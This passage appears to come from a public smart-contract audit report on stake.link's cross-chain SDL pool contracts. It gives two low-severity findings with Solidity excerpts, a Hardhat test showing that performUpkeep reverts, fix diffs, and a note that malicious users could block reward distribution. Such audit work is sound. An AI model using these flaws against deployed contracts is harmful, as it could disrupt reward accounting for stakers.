Since the protocol itself doesn't use the function there is no risk of it affecting it but being a user facing function is it worth to be aware of it.

## Tools Used

Manual Review

## Recommendations

To address these issues, consider implementing a more efficient storage solution:

- **Indexing Locks by Owner**: Maintain a mapping of owner addresses to an array of their lock IDs. This approach enables direct access to an owner's locks without iterating through the entire dataset.

## <a id='L-12'></a>L-12. Updates from the `secondary pool` to the `primary pool` may not be sent because there are `no rewards` for the secondary pool

_Submitted by [rvierdiiev](/profile/clk48xt1x005yl50815kr7bpc), [tychaios](/profile/clllk3iz80000jt08og98fzdl), [0xbepresent](/profile/clk8nnlbx000oml080k0lz7iy). Selected submission by: [0xbepresent](/profile/clk8nnlbx000oml080k0lz7iy)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol#L66

https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol#L157

## Summary

The [SDLPoolCCIPControllerSecondary::performUpkeep()](https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol#L66) function is only available when there is a [`message of rewards`](https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol#L157) from the `SDLPoolCCIPControllerPrimary`. That could be a problem if there are not rewards to distribute in a specific `secondary chain` causing that queue updates from the `secondarly chain` will not be informed to the `SDLPoolPrimary`.

## Vulnerability Details

The `secondary chain` informs to the `primary chain` the new `numNewRESDLTokens` and `totalRESDLSupplyChange` using the [SDLPoolCCIPControllerSecondary::performUpkeep](https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol#L66C14-L66C27) function, then the primary chain receives the [information](https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerPrimary.sol#L300) and it calculates the new [mintStartIndex](https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerPrimary.sol#L305). Note that the `primary chain` increments the `reSDLSupplyByChain` in the `code line 300`, this so that the `primary chain` has the information on how much supply of reSDL tokens there is in the `secondary chain`:

```solidity
File: SDLPoolCCIPControllerPrimary.sol
294:     function _ccipReceive(Client.Any2EVMMessage memory _message) internal override {
295:         uint64 sourceChainSelector = _message.sourceChainSelector;
296: 
297:         (uint256 numNewRESDLTokens, int256 totalRESDLSupplyChange) = abi.decode(_message.data, (uint256, int256));
298: 
299:         if (totalRESDLSupplyChange > 0) {
300:             reSDLSupplyByChain[sourceChainSelector] += uint256(totalRESDLSupplyChange);
301:         } else if (totalRESDLSupplyChange < 0) {
302:             reSDLSupplyByChain[sourceChainSelector] -= uint256(-1 * totalRESDLSupplyChange);
303:         }
304: 
305:         uint256 mintStartIndex = ISDLPoolPrimary(sdlPool).handleIncomingUpdate(numNewRESDLTokens, totalRESDLSupplyChange);
306: 
307:         _ccipSendUpdate(sourceChainSelector, mintStartIndex);
308: 
309:         emit MessageReceived(_message.messageId, sourceChainSelector);
310:     }
```

Now the [mintStartIndex is send to the secondary chain code line 307](https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerPrimary.sol#L307) and the secondary chain [receives the new mintStartIndex](https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol#L161). This entire process helps to keep the information updated between the primary chain and the secondary chain.

On the other hand, when a secondary chain receive rewards, the secondary chain can call the function [SDLPoolCCIPControllerSecondary::performUpkeep](https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol#L66C14-L66C27) since `shouldUpdate` is `true` at [code line 157](https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol#L157):

```solidity
File: SDLPoolCCIPControllerSecondary.sol
147:     function _ccipReceive(Client.Any2EVMMessage memory _message) internal override {
148:         if (_message.data.length == 0) {
149:             uint256 numRewardTokens = _message.destTokenAmounts.length;
150:             address[] memory rewardTokens = new address[](numRewardTokens);
151:             if (numRewardTokens != 0) {
152:                 for (uint256 i = 0; i < numRewardTokens; ++i) {
153:                     rewardTokens[i] = _message.destTokenAmounts[i].token;
154:                     IERC20(rewardTokens[i]).safeTransfer(sdlPool, _message.destTokenAmounts[i].amount);
155:                 }
156:                 ISDLPoolSecondary(sdlPool).distributeTokens(rewardTokens);
157:                 if (ISDLPoolSecondary(sdlPool).shouldUpdate()) shouldUpdate = true;
158:             }
159:         } else {
160:             uint256 mintStartIndex = abi.decode(_message.data, (uint256));
161:             ISDLPoolSecondary(sdlPool).handleIncomingUpdate(mintStartIndex);
162:         }
163: 
164:         emit MessageReceived(_message.messageId, _message.sourceChainSelector);
165:     }
```

Once `shouldUpdate` is `true`, the function [SDLPoolCCIPControllerSecondary::performUpkeep](https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol#L66C14-L66C27) can be called in order to send the new information (`numNewRESDLTokens` and `totalRESDLSupplyChange`) to the primary chain:

```solidity
    function performUpkeep(bytes calldata) external {
        if (!shouldUpdate) revert UpdateConditionsNotMet();

        shouldUpdate = false;
        _initiateUpdate(primaryChainSelector, primaryChainDestination, extraArgs);
    }
```

The problem is that the `primary chain` needs to send rewards to the `secondary chain` so that `shouldUpdate` is true and the function [SDLPoolCCIPControllerSecondary::performUpkeep](https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol#L66C14-L66C27) can be called. However, in certain circumstances it is possible that the `secondary chain` may never be able to send information to the primary chain since there may not be any rewards for the secondary chain. Please consider the next scenario:

1. `UserA` stakes directly in the `secondary chain` and the [queuedRESDLSupplyChange increments](https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/sdlPool/SDLPoolSecondary.sol#L373)
2. The increase in supply CANNOT be reported to the `primary chain` since `shouldUpdate = false` and the function [SDLPoolCCIPControllerSecondary::performUpkeep](https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol#L66C14-L66C27) will be reverted.
3. Rewards are calculated on the primary chain, however because the `secondary chain` has not been able to send the new supply information, [zero rewards reSDLSupplyByChain](https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerPrimary.sol#L84C39-L84C72) will be calculated for the secondary chain since `reSDLSupplyByChain[chainSelector]` has not been increased with the new information from `step 1`.
4. Since there are NO rewards assigned for the `secondary chain`, it is not possible to [set `shouldUpdate=True`](https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol#L157), therefore the function [SDLPoolCCIPControllerSecondary::performUpkeep](https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol#L66C14-L66C27) will be reverted.

The following test shows that a user can send `sdl` tokens to the `secondary pool` however [SDLPoolCCIPControllerSecondary::performUpkeep](https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol#L66C14-L66C27) cannot be called since there are no rewards assigned to the `secondary pool`:

```js
// File: test/core/ccip/sdl-pool-ccip-controller-secondary.test.ts
// $ yarn test --grep "codehawks performUpkeep reverts"
// 
  it('codehawks performUpkeep reverts', async () => {
    await token1.transfer(tokenPool.address, toEther(1000))
    let rewardsPool1 = await deploy('RewardsPool', [sdlPool.address, token1.address])
    await sdlPool.addToken(token1.address, rewardsPool1.address)
    assert.equal(fromEther(await sdlPool.totalEffectiveBalance()), 400)
    assert.equal((await controller.checkUpkeep('0x'))[0], false)
    assert.equal(await controller.shouldUpdate(), false)
    //
    // 1. Mint in the secondary pool
    await sdlToken.transferAndCall(
      sdlPool.address,
      toEther(100),
      ethers.utils.defaultAbiCoder.encode(['uint256', 'uint64'], [0, 0])
    )
    //
    // 2. The secondary pool needs to update data to the primary chain but the `controller.shouldUpdate` is false so `performUpkeep` reverts the transaction
    assert.equal(await sdlPool.shouldUpdate(), true)
    assert.equal((await controller.checkUpkeep('0x'))[0], false)
    assert.equal(await controller.shouldUpdate(), false)
    await expect(controller.performUpkeep('0x')).to.be.revertedWith('UpdateConditionsNotMet()')
  })
```

## Impact

`numNewRESDLTokens` and `totalRESDLSupplyChange` updates from the `secondary pool` to the `primary pool` may not be executed, causing the [rewards calculation](https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerPrimary.sol#L84C39-L84C72) to be incorrect for each chain.

## Tools used

Manual review

## Recommendations

The [SDLPoolCCIPControllerSecondary::performUpkeep](https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/ccip/SDLPoolCCIPControllerSecondary.sol#L66C14-L66C27) function may check if the `secondary pool` has new information and so do not wait for rewards to be available for the `secondary pool`:

```diff
    function performUpkeep(bytes calldata) external {
--      if (!shouldUpdate) revert UpdateConditionsNotMet();
++      if (!shouldUpdate && !ISDLPoolSecondary(sdlPool).shouldUpdate()) revert UpdateConditionsNotMet();

        shouldUpdate = false;
        _initiateUpdate(primaryChainSelector, primaryChainDestination, extraArgs);
    }
```
## <a id='L-13'></a>L-13. Single strategy failure blocks global reward distribution

_Submitted by [holydevoti0n](/profile/clk82nj2x001mm9087waeah19)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/RewardsInitiator.sol#L89-L91

## Summary
The `performUpkeep` function within the RewardsInitiator contract exhibits a critical flaw. This function, intended to update strategy rewards in the event of a negative rebase, is hindered by its stringent validation mechanism. Specifically, if any one of the strategies undergoing an update possesses a positive deposit change, the entire transaction is aborted. This mechanism not only fails to address the rewards update for other strategies with negative deposit changes but also halts the distribution of rewards to cross-chain SDL pools.

## Vulnerability Details
The vulnerability arises in the loop within the performUpkeep function, where each strategy's deposit change is evaluated. The existing condition checks if `IStrategy(strategies[strategiesToUpdate[i]]).getDepositChange()` is greater than or equal to zero. If this condition is met, the function reverts with a `PositiveDepositChange` error. This approach does not account for the scenario where multiple strategies are involved, and at least one has a positive deposit change. In such a case, even if other strategies require an update due to a negative deposit change, the function will prematurely terminate, leaving these strategies unattended.

## Impact
The primary impact of this issue is the potential blockade of the reward distribution process. In a scenario where multiple strategies are involved in the `performUpkeep` call, a single strategy with a positive deposit change can prevent the update of rewards for all other strategies, irrespective of their need for an update. This not only disrupts the intended functionality of the `performUpkeep` function but also negatively impacts the distribution of rewards to cross-chain SDL pools, effectively halting a critical component of the contract's operations.

Also a second case that can lead to this scenario: malicious users can cause a DDoS by ensuring that at least one the strategies remain with the positive balance as this result depends of the balanceOf function that is used to calculate the deposit change. 

## Tools Used
Manual Review

## Recommendations
### Selective Strategy Updating: 
Modify the loop to ignore strategies with a positive deposit change, allowing the update process to continue for those with negative changes. This ensures that the presence of a positively performing strategy does not impede the update process for others.

### Reference Implementation: 
For a more efficient solution, adopt a strategy similar to the one used in the Beefy contracts, specifically the VaultGasOverheadAnalyzer.sol(https://github.com/beefyfinance/beefy-contracts/blob/master/contracts/BIFI/keepers/contracts/VaultGasOverheadAnalyzer.sol). 
This mechanism keep checking and updating only the strategies that are "pending" without compromising the rewards distribution. 




